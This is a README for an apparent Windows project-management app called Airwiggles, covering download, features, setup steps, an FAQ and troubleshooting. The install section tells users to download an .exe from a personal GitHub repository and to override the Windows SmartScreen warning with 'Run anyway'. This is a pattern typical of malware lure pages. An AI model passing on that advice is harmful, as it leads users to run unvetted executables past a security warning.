## 📥 How to Download and Install

Visit the download page at **https://github.com/Sinestreal8362/airwiggles-project-manager** to get the latest version. Look for the **"Releases"** section on the right side of the page. Click the link that says **"Latest release"**.

On the release page, find the file named `Airwiggles-Setup-x.x.x.exe` (the x's represent the version number). Click on this file to download it to your computer.

Once the download finishes, open the file. Windows might show a blue warning screen saying "Windows protected your PC". Click **"More info"** and then **"Run anyway"**. The installer will guide you through the rest of the setup.

## 🎯 What You Can Do With Airwiggles

Airwiggles helps you organize your work in a visual way. You can:

**Create projects** with a simple click. Give your project a name, set a deadline, and invite team members.

**Add tasks** to each project. Break big work into smaller pieces. Assign tasks to specific people.

**Track progress** with boards and lists. Move tasks from "To Do" to "In Progress" to "Done" by dragging them with your mouse.

**Share files** with your team. Drag and drop documents, images, or spreadsheets into any task.

**Set due dates** and reminders. Airwiggles will send notifications when deadlines approach.

**Comment on tasks** to discuss details. Every task has its own conversation thread.

**See the big picture** with timeline views and calendars. Understand how your project fits together.

## 🚀 Getting Started

Follow these steps to create your first project:

**Step 1:** Open Airwiggles after installation. You will see a welcome screen.

**Step 2:** Click **"Create New Project"**. Type a name like "Marketing Campaign" or "Product Launch".

**Step 3:** Click **"Add Team Members"**. Enter the email addresses of people you want to invite.

**Step 4:** Click **"Create Project"**. Your workspace opens.

**Step 5:** Click **"Add Task"** in the main area. Give the task a name, like "Design logo" or "Write blog post".

**Step 6:** Assign the task to a team member by clicking the person icon.

**Step 7:** Set a due date by clicking the calendar icon.

**Step 8:** Click **"Save"** to add the task to your board.

## 🔧 Using the Main Features

### Project Boards
The board view shows all your tasks in columns. You can create custom columns for different stages of work. Common columns include "Backlog", "In Progress", "Review", and "Completed".

### Task Details
Click any task to open its detail panel. Here you can:
- Add a description
- Upload attachments
- Write comments
- Set priority (Low, Medium, High, Urgent)
- Track time spent

### Team View
See who is working on what. The team view shows each person's tasks and their current workload. You can see if someone has too many tasks.

### Calendar
The calendar shows all deadlines and milestones. You can switch between month, week, and day views. Drag tasks to change their due dates.

### Reports
Generate reports to see project health. Reports show completed tasks, overdue items, and team productivity.

## ❓ Common Questions

**Do I need an account?**
Yes. You create a free account when you first open the application.

**Can I use Airwiggles offline?**
Airwiggles requires an internet connection to sync with your team. You cannot use it fully offline.

**How many projects can I create?**
The free version allows up to 5 projects. Paid plans remove this limit.

**Can I export my data?**
Yes. Go to Settings > Export Data. You can download your projects as CSV or JSON files.

**Is there a mobile app?**
Airwiggles works on mobile browsers. We do not have a dedicated mobile app.

## 🧹 Troubleshooting

**Application won't start**
Close Airwiggles completely. Right-click the system tray icon and select "Exit". Open the application again from the Start menu.

**White screen on launch**
This usually means the application cannot connect to our servers. Check your internet connection. If the problem continues, restart your computer.

**Tasks not saving**
Make sure you have a stable internet connection. If the problem persists, sign out and sign back in.

**Notifications not appearing**
Check your notification settings in Windows. Go to Windows Settings > System > Notifications. Make sure Airwiggles is allowed to send notifications.

**Slow performance**
Close other browser tabs and applications. Reduce the number of visible tasks by using filters.
